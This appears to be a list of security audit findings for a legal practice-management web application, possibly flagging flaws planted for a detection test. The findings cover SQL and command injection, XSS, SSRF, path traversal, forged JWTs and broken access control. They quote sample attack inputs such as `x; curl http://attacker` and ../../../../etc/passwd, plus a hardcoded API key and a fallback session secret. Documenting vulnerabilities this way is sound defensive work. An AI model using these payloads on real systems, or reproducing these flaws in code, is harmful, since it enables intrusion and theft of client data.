extra.message: runMatterLedgerReport() concatenates URL-controlled values (practiceAreaFilter and sortField, passed from the loader in api.matters.ledger-report.ts lines 9-12) directly into a raw SQL string executed with prisma.$queryRawUnsafe(). An attacker can inject arbitrary SQL via the practiceAreaId or sortField query parameters (e.g. practiceAreaId=' OR '1'='1).

convertFilingDocument() passes the attacker-controlled format parameter (from ?format= in api.documents.$documentId.download.ts loader) and the stored sourcePath into an unquoted execSync shell command (`pandoc ${sourcePath} -o ${outputPath} -t ${format}`). A crafted format such as `pdf; curl attacker` results in OS command injection (RCE).

buildExhibitPreview() spawns a shell command with shell:true interpolating originalName and storedPath, both derived from the client-uploaded file name in _app.portal.upload.tsx. A multipart filename containing shell metacharacters (e.g. `x; curl http://attacker`) is executed on the server, giving a low-privileged client OS command injection (RCE).

The client portal upload action calls buildExhibitPreview(storedPath, file.name) (document-export.ts:22) which executes an unquoted shell command built from the attacker-controlled uploaded filename (shell:true). Any authenticated client can achieve arbitrary command execution on the server.

storeClientExhibit() builds the destination path as `${Date.now()}_${originalName}` and writes with writeFileSync(join(uploadsDir, storedName)). The client-controlled uploaded filename is not sanitized; a filename containing ../ segments lets an authenticated client write files outside the uploads directory (path traversal / arbitrary file write).

Note content is rendered with dangerouslySetInnerHTML={{ __html: renderNoteBody(n.content) }}. renderNoteBody (note-formatting.ts:4-9) only converts newlines/bold/italic and does NOT HTML-escape the content, so any note containing HTML/JS (e.g. created by a client who may post notes via the matter action) is executed as markup -> stored XSS against attorneys viewing the notes tab.

renderNoteBody() returns content with only newline/emphasis transforms and no HTML escaping, while the sibling renderMessageBody() escapes HTML first. Combined with dangerouslySetInnerHTML usage in the notes route this is stored XSS (a client or staff note can inject

renderCaseWidgetPage() interpolates the matter title and status into a <script> tag string without any escaping (`var caseState = { title: "${matterTitle}" ...`). The page is served unauthenticated and reflects stored matter data, so a matter title containing `"};</script><script>...` results in stored XSS in any viewer's browser (the sibling filing-status widget escapes for the script context).

applyAdvancedTaskFilter() JSON.parses the client-supplied x-task-filter header and spreads it into the role-scoped Prisma where object ({ ...where, ...advanced }). A user can override the role/matter scoping (e.g. replace where.matter/where.OR) and read tasks belonging to other clients/matters, and inject arbitrary query operators - broken access control via query-filter injection.

This export action only calls requireUser() and then exportMatterTimeline(matterId, user.id, sharingTier). exportMatterTimeline (matter-sharing.ts:11-29) performs no matter-ownership check and trusts the client-supplied sharingTier form field: any authenticated user can request sharingTier='full_file' for ANY matter id and receive all notes and messages, including privileged, non-client-visible notes and internal drafts - broken access control / data exposure.

The risk-score loader performs NO authentication or authorization check (no requireUser/requireMatterAccess). Any unauthenticated caller who knows/guesses a matter id receives the risk snapshot including matter sensitivity, privileged-note/document counts and the client's conflictNotes (loadMatterRiskSnapshot lines 6-25). Additionally, ?diagnostics=verbose returns the raw Error message and stack trace (describeRiskSnapshotFailure lines 31-36) - information disclosure.

The intake webhook endpoint has no authentication/signature check and applyIntakeWebhookPayload (intake-sync.ts:9-18) JSON.parses the raw body and Object.assigns every field onto prisma.matter.update data. An unauthenticated attacker can mass-assign arbitrary columns (including status, attorneyId, title, etc.) on any matter - unauthorized data modification.

applyConflictVendorVerdict() trusts `if (result.access)` (truthiness on a JSON body field) and a client-supplied x-vendor-review-tier header. The endpoint has no vendor authentication, so an attacker can POST {access:'yes'} to clear any client's conflict flag (status='active') and set arbitrary conflictNotes - a spoofed verdict bypassing the conflict-of-interest screening.

The citation-preview loader passes the client-controlled x-citation-source header directly to fetchCitationPreview(sourceUrl) (citation-preview.ts:8) which performs an arbitrary server-side fetch with no host allowlist. Any authenticated user can make the server issue requests to internal addresses (e.g. cloud metadata 169.254.169.254, internal services) -> SSRF.

importCourtFeedSubscription() fetches a caller-supplied feed URL (SSRF, reachable via the deadlines route action) and parseFeedDocument() resolves <!ENTITY ... SYSTEM "file://..."> declarations by reading the referenced local file with fs.readFileSync and substituting its content - an XXE-style arbitrary local file read. An attacker-supplied feed document can exfiltrate local files (e.g. /etc/passwd) via entity substitution.

loadFilingTemplate() joins the caller-controlled templateName directly onto the templates directory and readFileSync's it with no containment check. The matters/new route 'preview-template' action passes an unvalidated form value, so any staff user can read arbitrary server files by posting templateName=../../../../etc/passwd (the sibling loadFilingTemplateSafely does the required containment check).

verifyPortalConfirmationCode() returns `submitted.length > 0` - it never compares the submitted code to the stored value, so ANY non-empty string is accepted as a valid portal confirmation. Combined with _public.confirm-portal.tsx (email + code, no password), an attacker who knows a victim's email can authenticate as them (account takeover). Registration also creates a full session without any real email verification (_public.register.tsx:56-59).

The login form's redirectTo value is taken straight from the submitted form data and passed to createUserSession(user.id, redirectTo) which issues redirect(redirectTo) (auth.ts:69-77) with no allowlist. A crafted login URL/form can redirect the authenticated user to an arbitrary external origin - open redirect (CWE-601).

After fetching the vendor verification result, the client edit action stores the client's tax id and full bank account number in cleartext columns via attachVerificationResult() (client-verification.ts:25-33), instead of the AES-encrypted path attachVerificationResultSecurely() used elsewhere - sensitive financial data at rest (CWE-312/CWE-200).

verifyClosureConfirmation() verifies the partner assertion with jwt.verify(token, secret, { algorithms: ['HS256','none'] }). Allowing the 'none' algorithm lets an attacker forge a valid closure-confirmation assertion (no signature) for any matter, bypassing the signature check on api.billing-confirmation and api.partner-handshake-billing. The default signing secret is also empty (line 7) when PM_SYNC_SIGNING_SECRET is unset.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: A static, production-looking API key ('pk_9f3a7c2e1b6d4f8a0c5e2b7d9f1a3c6e') is hardcoded in source and used as a Bearer credential by notifyLegacyGatewayOfClosure(). Anyone with repository access obtains a credential valid against the legacy billing gateway.

When SESSION_SECRET is not set, the session cookie signing secret falls back to a hardcoded, publicly-known value ('dev-secret-min-32-chars-long!!!'). The same fallback is reused for co-counsel review-link JWTs (co-counsel-access.ts:3). If the app is deployed without overriding the env var, an attacker can forge signed session cookies for any user (including firm_admin), i.e. full authentication bypass.

applyPracticeAreaRate() builds a server-side function with `new Function('params', 'return (' + rule + ');')` where rule is the practice area's stored description (matters.$matterId._index.tsx 'estimate-cost' action passes matter.practiceArea.description). Stored data is evaluated as JavaScript on the server; a value crafted to be a JS expression (or an attacker who can influence a practice area record) achieves code injection / remote code execution.

provisionRosterAccount() hashes temp credentials with bcrypt cost factor `workFactor || 4` where workFactor comes from the admin-supplied JSON body (api.staff.provision.ts:18). A work factor of 4 is trivially brute-forceable, weakening temp credentials created through the onboarding tool (the v2 endpoint fixes the factor at 12).

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort

extra.message: The deadline action only requires an authenticated user (requireUser) - it never checks the user's role or relationship to the deadline's matter before marking it complete/reopened. Unlike the task actions (requireTaskAccess) and the loader (which blocks foreign clients), any authenticated client/staff can complete or reopen ANY deadline by id - broken access control (IDOR).

applyQuickEdit() folds every submitted form field onto the task record and updates with the full object (`Object.assign(task, submitted)` then update(data: task)). A user with access to the task can mass-assign fields beyond the intended title/priority/dueDate - e.g. matterId, assigneeId, isCompleted - modifying task data outside the intended scope.

applyIntegrationCorsHeaders() reflects any Origin header and sets Access-Control-Allow-Credentials: true on an endpoint that authenticates with cookies (requireMatterAccess). A malicious origin can make cross-origin credentialed reads of task/deadline summaries for a logged-in victim (compare the allow-listed version in api.matters.$matterId.timeline.ts) - CORS misconfiguration enabling cross-site data theft.

sealNoteContentSecurely()/unsealNoteContentSecurely() are named and documented as an AEAD seal but only base64-encode the content and ignore the passcode. The messages route (messages.tsx:71-81) uses these to 'seal' drafts, so the claimed passcode protection provides no confidentiality or access control - anyone who can read the message column can decode the content without the passcode (broken/insecure crypto).

issueCoCounselReviewLink()/verifyCoCounselReviewLink() mint JWT review links with no expiry, so a leaked review token grants permanent read access to a matter's client-visible notes (route /case-review/:token). The secure counterpart issues tokens that expire after 30 minutes.
